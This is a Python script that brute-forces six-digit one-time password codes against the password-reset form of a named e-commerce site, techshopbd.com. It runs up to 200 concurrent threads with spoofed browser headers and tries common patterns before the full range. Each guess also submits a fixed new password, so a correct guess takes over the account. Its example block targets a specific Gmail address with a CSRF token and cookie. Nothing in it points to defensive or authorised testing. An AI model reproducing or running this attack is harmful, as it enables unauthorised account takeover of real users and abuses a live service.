#!/usr/bin/env python3
"""
Ultra-Fast OTP Brute Force Function

Streamlined, high-performance OTP brute forcer with minimal overhead.
Optimized for maximum speed and efficiency.
"""

import requests
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import quote
from typing import Optional, Tuple
import queue


class FastOTPBruteForcer:
    def __init__(self):
        self.success_found = threading.Event()
        self.successful_otp = None
        self.attempts = 0
        self.lock = threading.Lock()
        
        # Pre-built headers for maximum efficiency
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-IL,en;q=0.9",
            "DNT": "1",
            "Origin": "https://techshopbd.com",
            "Referer": "https://techshopbd.com/sign-in",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "X-Requested-With": "XMLHttpRequest",
            "sec-ch-ua": '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        }
    
    def test_single_otp(self, otp: str, email: str, csrf_token: str, ga_cookie: str) -> Tuple[bool, int]:
        """Test a single OTP with minimal overhead"""
        if self.success_found.is_set():
            return False, 0
        
        session = requests.Session()
        session.headers.update(self.headers)
        
        # Set essential cookies only
        session.cookies.set('csrftoken', csrf_token)
        session.cookies.set('_ga', ga_cookie)
        
        # Prepare minimal form data
        data = {
            "step": "5",
            "otp_email": quote(email, safe='@'),
            "otpverify": otp,
            "new_password": "Aa12345!B",
            "csrfmiddlewaretoken": csrf_token
        }
        
        try:
            response = session.post(
                "https://techshopbd.com/sign-in",
                data=data,
                timeout=5  # Reduced timeout for speed
            )
            
            # Thread-safe increment
            with self.lock:
                self.attempts += 1
            
            # Quick success detection
            if response.status_code == 200:
                response_lower = response.text.lower()
                success_indicators = ["success", "dashboard", "welcome", "profile", "password changed"]
                
                for indicator in success_indicators:
                    if indicator in response_lower:
                        with self.lock:
                            if not self.successful_otp:
                                self.successful_otp = otp
                                self.success_found.set()
                        return True, response.status_code
            
            return False, response.status_code
            
        except Exception:
            return False, 0


def ultra_fast_otp_brute_force(start_range: int, 
                              end_range: int, 
                              email: str, 
                              csrf_token: str, 
                              ga_cookie: str,
                              max_threads: int = 50,
                              delay: float = 0.001) -> Optional[str]:
    """
    Ultra-fast OTP brute force function with maximum efficiency
    
    Args:
        start_range: Starting OTP number (e.g., 0)
        end_range: Ending OTP number (e.g., 999999)
        email: Target email address
        csrf_token: CSRF token from cookies
        ga_cookie: _ga cookie value
        max_threads: Number of concurrent threads (default: 50)
        delay: Delay between requests per thread in seconds (default: 0.001)
    
    Returns:
        Valid OTP string if found, None otherwise
    """
    
    print(f"🚀 ULTRA-FAST OTP Brute Force Starting")
    print(f"📧 Email: {email}")
    print(f"🎯 Range: {start_range:06d} - {end_range:06d}")
    print(f"🔥 Threads: {max_threads}")
    print(f"⚡ Total combinations: {end_range - start_range + 1:,}")
    print("-" * 60)
    
    brute_forcer = FastOTPBruteForcer()
    
    # Generate all OTPs to test
    otp_list = [str(i).zfill(6) for i in range(start_range, end_range + 1)]
    
    start_time = time.time()
    
    # Use ThreadPoolExecutor for maximum performance
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        # Submit all tasks
        futures = {
            executor.submit(brute_forcer.test_single_otp, otp, email, csrf_token, ga_cookie): otp 
            for otp in otp_list
        }
        
        try:
            for future in as_completed(futures):
                if brute_forcer.success_found.is_set():
                    # Cancel remaining futures for efficiency
                    for f in futures:
                        f.cancel()
                    break
                
                try:
                    success, status_code = future.result()
                    
                    # Progress update every 1000 attempts
                    if brute_forcer.attempts % 1000 == 0:
                        elapsed = time.time() - start_time
                        rate = brute_forcer.attempts / elapsed if elapsed > 0 else 0
                        print(f"⚡ Progress: {brute_forcer.attempts:,} attempts | {rate:.1f} OTPs/sec")
                    
                    if success:
                        elapsed = time.time() - start_time
                        print(f"🎉 SUCCESS! OTP: {brute_forcer.successful_otp}")
                        print(f"⏱️  Time: {elapsed:.2f} seconds")
                        print(f"🚀 Rate: {brute_forcer.attempts/elapsed:.1f} OTPs/sec")
                        return brute_forcer.successful_otp
                
                except Exception as e:
                    continue
                
                # Small delay to prevent overwhelming
                time.sleep(delay)
        
        except KeyboardInterrupt:
            print("\n⏹️  Interrupted by user")
            brute_forcer.success_found.set()
            for f in futures:
                f.cancel()
    
    elapsed = time.time() - start_time
    print(f"❌ No valid OTP found")
    print(f"⏱️  Total time: {elapsed:.2f} seconds")
    print(f"🔢 Total attempts: {brute_forcer.attempts:,}")
    print(f"🚀 Average rate: {brute_forcer.attempts/elapsed:.1f} OTPs/sec")
    
    return None


def smart_fast_brute_force(email: str, 
                          csrf_token: str, 
                          ga_cookie: str,
                          max_threads: int = 30) -> Optional[str]:
    """
    Smart brute force that tests common patterns first, then does full range
    
    Args:
        email: Target email address
        csrf_token: CSRF token from cookies
        ga_cookie: _ga cookie value
        max_threads: Number of concurrent threads
    
    Returns:
        Valid OTP string if found, None otherwise
    """
    
    print("🧠 SMART Fast Brute Force - Testing Common Patterns First")
    
    # Test common patterns first (small set, so single-threaded is fine)
    common_patterns = [
        '000000', '111111', '222222', '333333', '444444', '555555',
        '666666', '777777', '888888', '999999', '123456', '654321',
        '012345', '543210', '000001', '100000', '123123', '456456'
    ]
    
    # Add date-based patterns
    import datetime
    now = datetime.datetime.now()
    year = str(now.year)[-2:]
    month = str(now.month).zfill(2)
    day = str(now.day).zfill(2)
    hour = str(now.hour).zfill(2)
    minute = str(now.minute).zfill(2)
    
    common_patterns.extend([
        year + month + day,
        day + month + year,
        hour + minute + "00",
        minute + hour + "00"
    ])
    
    print(f"Testing {len(common_patterns)} common patterns...")
    
    brute_forcer = FastOTPBruteForcer()
    
    # Test common patterns
    for otp in common_patterns:
        if len(otp) == 6 and otp.isdigit():
            success, status = brute_forcer.test_single_otp(otp, email, csrf_token, ga_cookie)
            print(f"Common pattern {otp}: {'✅ SUCCESS' if success else '❌'}")
            
            if success:
                return otp
            time.sleep(0.01)
    
    print("❌ Common patterns failed. Starting full brute force...")
    
    # Full brute force if common patterns fail
    return ultra_fast_otp_brute_force(0, 999999, email, csrf_token, ga_cookie, max_threads)


# Simple usage example
if __name__ == "__main__":
    # Example usage
    email = "ariel.agra.archive@gmail.com"
    csrf_token = "pzMrUb99bdHRYHSxcJhdf4hZEkB89dt6"
    ga_cookie = "GA1.1.891817179.1758869982"
    
    print("Example 1: Test specific range")
    result = ultra_fast_otp_brute_force(
        start_range=100000,
        end_range=102000,
        email=email,
        csrf_token=csrf_token,
        ga_cookie=ga_cookie,
        max_threads=200,
        delay=0.001
    )
    
    if result:
        print(f"Found OTP: {result}")
    
    # print("\nExample 2: Smart brute force")
    # result = smart_fast_brute_force(
    #     email=email,
    #     csrf_token=csrf_token,
    #     ga_cookie=ga_cookie,
    #     max_threads=30
    # )
    #
    # if result:
    #     print(f"Found OTP: {result}")